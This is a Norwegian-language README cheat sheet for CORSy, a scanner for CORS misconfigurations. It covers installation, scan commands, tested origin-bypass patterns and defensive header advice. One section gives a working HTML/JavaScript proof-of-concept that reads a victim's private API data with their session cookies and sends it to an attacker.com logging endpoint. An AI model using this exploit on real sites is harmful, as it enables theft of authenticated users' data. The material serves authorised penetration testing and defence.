<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Nettsikkerhet">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Raskt og omfattende CLI-verktøy utviklet for å oppdage feilkonfigurasjoner av Cross-Origin Resource Sharing (CORS) og teste for risiko for datatyveri på tvers av opprinnelse</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Overview & CORS Vulnerability Basics](#-overview--cors-vulnerability-basics)
  - [The Fatal Trio: Origin Reflection + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Installasjon](#-installasjon)
– [Grunnleggende målskanning](#-grunnleggende målskanning)
- [CORS Attack Vectors Tested](#-cors-attack-vectors-tested)
  - [Arbitrary Origin Reflection](#arbitrary-origin-reflection)
  - [Trusting Null Origin (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Prefix & Suffix Regex Bypass](#prefix--suffix-regex-bypass)
  - [Wildcard Subdomain Trust](#wildcard-subdomain-trust)
  - [Special Character Bypass (`_`, `;`, `!`)](#spesial-character-bypass----)
- [Multi-Target Scanning & Output Export](#-multi-target-scanning--output-export)
- [Crafting Proof-of-Concept (PoC) Exploits](#-crafting-proof-of-concept-poc-exploits)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Secure Headers](#-defensive-considerations--secure-headers)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og grunnleggende om CORS-sårbarhet

**Cross-Origin Resource Sharing (CORS)** er en nettlesersikkerhetsmekanisme som lar webservere lempe på **Same-Origin Policy (SOP)**. Ved å returnere overskrifter som:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

En nettapplikasjon gir andre nettsteder tillatelse til å lese HTTP-svarene på vegne av offerbrukeren.

### The Fatal Trio: Origin Reflection + Credentials Sant
Når en applikasjon blindt reflekterer den innkommende `Origin`-overskriften i `Access-Control-Allow-Origin` og aktiverer `Access-Control-Allow-Credentials: true`, kan ethvert ondsinnet nettsted tvinge en autentisert besøkendes nettleser til å lese private meldinger, API-nøkler og kontodetaljer.

Laget av **Somdev Sangwan (s0md3v)**, **CORSy** sonderer systematisk endepunkter med 16+ kjente opprinnelsespermutasjoner for å oppdage disse feilkonfigurasjonene.

---

## 📥 Installasjon
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Grunnleggende målskanning

Skann et enkelt nettapplikasjonsendepunkt:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Legg til egendefinerte overskrifter eller øktinformasjonskapsler:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ CORS angrepsvektorer testet

CORSy tester automatisk flere opprinnelses-permutasjonsmønstre:

### Vilkårlig opprinnelsesrefleksjon
Serveren speiler blindt ethvert domene:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Trusting Null Origin (`Origin: null`)
Apper kan stole på `null`-opprinnelse (vanlig med lokale sandboxed iframes eller `data:` URL-er):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Kan utløses ved å laste victim API fra en iframe med `sandbox="allow-scripts allow-top-navigation"`.*

### Prefiks og suffiks Regex Bypass
Dårlig regex-validering (f.eks. `.*target.com` eller `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### Spesialtegn forbikobling (`_`, `;`, `!`)
Nettlesere og servere håndterer URI-skilletegn forskjellig:
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 Multi-Target Scanning & Output Export

Skann store lister over API-endepunkter oppdaget fra rekognosering:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Lage Proof-of-Concept (PoC)-utnyttelser

Når CORSy bekrefter en feilkonfigurasjon med legitimasjon tillatt, generer en HTML-utnyttelse for å stjele sensitive data:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Skann enkelt URL** | `python3 corsy.py -u <URL>` |
| **Skann med øktinformasjonskapsel** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Skann URL-liste** | `python3 corsy.py -i targets.txt` |
| **Multi-Threaded Scan** | `python3 corsy.py -i targets.txt -t 20` |
| **Eksporter til JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Defensive betraktninger og sikre overskrifter

1. **Reflekter aldri opprinnelse vilkårlig:** Sammenlign `Origin`-overskriften med en eksplisitt, streng hviteliste på serversiden.
2. **Par aldri jokertegn med legitimasjon:** Nettleseren blokkerer `Access-Control-Allow-Origin: *` med `Credentials: true`, men emuler den aldri dynamisk.
3. **Unngå å stole på `null`:** Ikke legg til `null` i retningslinjer for pålitelig opprinnelse.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> CORSy er ment for autoriserte sikkerhetsvurderinger, penetrasjonstesting og defensiv revisjon. Å teste nettsider uten autorisasjon er ulovlig.